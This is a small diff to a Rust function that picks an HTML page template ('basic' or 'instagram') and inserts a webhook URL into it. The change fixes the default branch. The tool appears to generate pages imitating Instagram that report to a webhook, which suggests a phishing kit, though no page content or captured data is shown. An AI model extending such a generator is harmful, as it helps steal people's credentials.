@@ -108,6 +108,6 @@ fn page(platform: &str, webhook_url: &str) -> String {
     match platform {
         "basic" => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
         "instagram" => INSTAGRAM_PAGE.replace("{{DS-HOOK}}", webhook_url),
-        _ => INSTAGRAM_HTML.replace("{{DS-HOOK}}", webhook_url),
+        _ => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
     }
 }
